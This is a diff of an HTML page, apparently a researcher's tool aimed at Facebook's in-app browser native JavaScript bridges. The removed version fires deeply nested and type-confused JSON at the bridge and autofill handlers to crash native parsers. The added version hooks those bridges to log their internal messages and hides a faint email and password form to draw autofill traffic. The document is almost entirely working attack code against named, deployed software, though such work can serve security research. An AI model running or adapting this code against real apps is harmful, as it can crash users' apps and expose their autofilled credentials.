@@ -1,68 +1,59 @@
 <!DOCTYPE html>
 <html>
-<head><title>JSI Stack Buster</title></head>
-<body style="background:#000; color:#0f0;">
-    <h3>Executing Stack Buster...</h3>
-    <div id="log"></div>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>JSI Sniffer</title>
+    <style>
+        body { background: #111; color: #0f0; font-family: monospace; word-wrap: break-word; font-size: 14px; }
+        .alert { color: #ff0; padding-top: 10px; border-top: 1px solid #333; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h3>Sniffing Facebook's Internal IPC...</h3>
+    <div id="log">Waiting for Facebook to inject bridges...<br></div>
+
+    <form style="opacity: 0.1;">
+        <input type="text" name="email" autocomplete="username">
+        <input type="password" name="password" autocomplete="current-password">
+    </form>
 
     <script>
         const logEl = document.getElementById('log');
         function log(msg) { logEl.innerHTML += msg + "<br>"; }
 
-        // 1. Generate Deeply Nested JSON (The "Stack Buster")
-        // This is tiny in memory but destroys recursive C++ parsers
-        let deepJson = '{"data":';
-        let depth = 5000; // Start with 5000. If no crash, increase to 15000.
-        
-        for(let i=0; i < depth; i++) deepJson += '{"a":';
-        deepJson += '"pwn"';
-        for(let i=0; i < depth; i++) deepJson += '}';
-        deepJson += '}';
-
-        // 2. Generate Malformed/Unexpected Types
-        // Passing an array where a string is expected often causes native crashes
-        const typeConfusionJson = JSON.stringify({
-            "action": "test_event",
-            "callback": null,
-            "data": [1, 2, 3, {"a": "b"}], // Array instead of String
-            "timestamp": "Not A Number" // String instead of Int
-        });
-
-        const payloads = [deepJson, typeConfusionJson];
-
-        function strike() {
-            log("[*] Firing precision payloads...");
+        // We use a fast interval to catch the bridge the exact moment Facebook injects it
+        let snifferInterval = setInterval(() => {
             
-            payloads.forEach(p => {
-                // Target 1: Unified Bridge (The main C++ tunnel)
-                if (typeof window.__call_iabjs_unified_bridge === 'function') {
-                    try { window.__call_iabjs_unified_bridge(p); } catch(e) {}
-                    try { window.__call_iabjs_unified_bridge("test_event", p); } catch(e) {}
-                }
+            // Hook the Unified Bridge
+            if (window.__call_iabjs_unified_bridge && !window.__call_iabjs_unified_bridge._isHooked) {
+                let realBridge = window.__call_iabjs_unified_bridge;
+                
+                window.__call_iabjs_unified_bridge = function() {
+                    let args = Array.from(arguments);
+                    log("<div class='alert'>🚨 <b>UNIFIED BRIDGE INTERCEPT:</b><br>" + JSON.stringify(args) + "</div>");
+                    return realBridge.apply(this, arguments);
+                };
+                window.__call_iabjs_unified_bridge._isHooked = true;
+                log("[+] Hooked __call_iabjs_unified_bridge!");
+            }
 
-                // Target 2: The Object Bridge
-                if (window.iabjs_unified_bridge) {
-                    let methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window.iabjs_unified_bridge));
-                    methods.forEach(m => {
-                        if (typeof window.iabjs_unified_bridge[m] === 'function') {
-                            try { window.iabjs_unified_bridge[m](p); } catch(e) {}
-                        }
-                    });
-                }
+            // Hook the Autofill Message Handler
+            if (window._AutofillMessageHandler && window._AutofillMessageHandler.postMessage && !window._AutofillMessageHandler._isHooked) {
+                let realAutofill = window._AutofillMessageHandler.postMessage;
+                
+                window._AutofillMessageHandler.postMessage = function() {
+                    let args = Array.from(arguments);
+                    log("<div class='alert'>🚨 <b>AUTOFILL INTERCEPT:</b><br>" + JSON.stringify(args) + "</div>");
+                    return realAutofill.apply(this, arguments);
+                };
+                window._AutofillMessageHandler._isHooked = true;
+                log("[+] Hooked _AutofillMessageHandler!");
+            }
 
-                // Target 3: Autofill
-                if (window._AutofillMessageHandler) {
-                    try { window._AutofillMessageHandler.postMessage(p); } catch(e) {}
-                }
-            });
-        }
+        }, 10); // Check every 10ms
 
-        // Fire immediately
-        strike();
-
-        // Fire gently to avoid GC panics
-        setInterval(strike, 1000);
-
+        // Trigger a fake scroll event to wake up performance loggers
+        setTimeout(() => { window.dispatchEvent(new Event('scroll')); }, 1000);
     </script>
 </body>
 </html>
